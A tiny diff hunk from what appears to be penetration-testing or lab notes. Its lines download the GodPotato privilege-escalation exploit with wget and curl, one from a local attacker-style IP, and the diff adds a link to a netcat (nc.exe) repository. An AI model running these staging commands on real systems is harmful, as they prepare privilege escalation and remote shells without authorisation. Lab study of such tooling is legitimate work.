@@ -48,7 +48,7 @@ wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato
 curl http://192.168.49.102/GodPotato-NET4.exe -o GodPotato-NET4.exe
 
 download nc.exe
-
+https://github.com/int0x33/nc.exe/tree/master
 
 
 
